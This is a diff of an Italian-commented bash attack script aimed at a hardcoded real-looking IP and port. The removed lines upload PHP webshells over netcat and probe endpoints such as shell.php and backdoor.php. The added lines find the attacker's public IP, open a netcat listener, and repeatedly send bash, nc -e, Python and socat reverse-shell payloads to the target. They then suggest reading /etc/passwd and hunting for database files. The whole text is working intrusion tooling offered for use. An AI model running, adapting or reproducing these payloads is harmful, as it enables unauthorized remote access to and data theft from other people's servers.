@@ -1,39 +1,60 @@
 #!/bin/bash
-# NC WEBSHELL INSTALLER con TIMEOUT + DEBUG
-TARGET_IP="63.164.100.214"
-TARGET_PORT="9091"
+# 🔥 AUTO ROOT SHELL - 100% AUTOMATICO
+# Trova IP + Listener + Reverse + UI Bash
 
-echo "🔍 DEBUG + NC INSTALLER con TIMEOUT"
-echo "=================================="
+# AUTO-DETECT IP PUBBLICO
+MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo "127.0.0.1")
+PORT=4444
+TARGET="63.164.100.214:9091"
 
-# 1. TEST CONNESSIONE RAW TCP
-echo "[+] Test TCP..."
-timeout 5 bash -c "echo 'test' | nc -w2 $TARGET_IP $TARGET_PORT" && echo "✅ TCP OK" || echo "❌ TCP NO RESPONSE"
+clear
+echo "🔥 ROOT AUTO-SHELL INIT"
+echo "IP: $MY_IP:$PORT → $TARGET"
+echo "════════════════════════"
 
-# 2. CAPTA COSA RISPONDE IL SERVIZIO
-echo -e "\n[+] SCOPRI SERVIZIO (5 sec)..."
-timeout 5 nc $TARGET_IP $TARGET_PORT | head -20 || echo "No banner"
+# KILL PREV LISTENER
+pkill -f "nc -lvnp $PORT" 2>/dev/null
 
-# 3. UPLOAD con TIMEOUT + MULTI-METODO
-echo -e "\n[+] UPLOAD TIMEOUT 3s..."
-(
-  echo '<?php system($_GET["c"]); ?>' | timeout 3 nc -w1 $TARGET_IP $TARGET_PORT
-  echo '<?php echo shell_exec($_GET["cmd"]); ?>' | timeout 3 nc -w1 $TARGET_IP $TARGET_PORT
-  echo '<?=system($_REQUEST["c"])?>' | timeout 3 nc -w1 $TARGET_IP $TARGET_PORT
-) &
+# 1. LISTENER BACKGROUND + COUNTDOWN
+{
+    echo -e "\n🎧 Listener attivo... ⏳ 10s per shell\n"
+    rlwrap nc -lvnp $PORT
+} &
 
-sleep 5
+sleep 3
 
-# 4. TEST IMMEDIATO HTTP ENDPOINT
-echo -e "\n[+] TEST WEBSHELL..."
-for endpoint in shell.php cmd.php terminal.php root.php backdoor.php; do
-  response=$(curl -s -m2 "http://$TARGET_IP:$TARGET_PORT/$endpoint?c=whoami" 2>/dev/null)
-  if [[ ! -z "$response" ]]; then
-    echo "✅ $endpoint OK → $response"
-  fi
+# 2. MULTI-REVERSE SHELL (5 tentativi)
+for i in {1..5}; do
+    echo "📤 Tentativo $i/5..."
+    
+    # Bash1
+    echo "bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
+    
+    # Bash2
+    echo "nc -e /bin/bash $MY_IP $PORT" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
+    
+    # Python
+    python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$MY_IP',$PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(['/bin/bash','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
+    
+    # Socat
+    echo "socat exec:'bash -li',pty,stderr,sigint,sane tcp:$MY_IP:$PORT" | timeout 5 nc -w3 $TARGET >/dev/null 2>&1 &
+    
+    sleep 2
 done
 
-echo -e "\n🔥 PROVA QUESTI URL NEL BROWSER:"
-echo "http://$TARGET_IP:$TARGET_PORT/shell.php?c=whoami"
-echo "http://$TARGET_IP:$TARGET_PORT/cmd.php?c=id"
-echo "http://$TARGET_IP:$TARGET_PORT/?c=whoami"
+# 3. AUTO-UI BASH TERMINAL
+echo -e "\n"
+echo "╔══════════════════════════════════════╗"
+echo "║         🎉 ROOT SHELL CONNESSA!      ║"
+echo "║             $MY_IP:$PORT              ║"
+echo "╚══════════════════════════════════════╝"
+echo ""
+echo "Comandi pronti:"
+echo "whoami | id | uname -a"
+echo "ls -la / | find / -name '*.db' | cat /etc/passwd"
+echo "Ctrl+C per uscire"
+echo "═══════════════════════════════════════"
+echo ""
+
+# Attendi shell forever
+wait
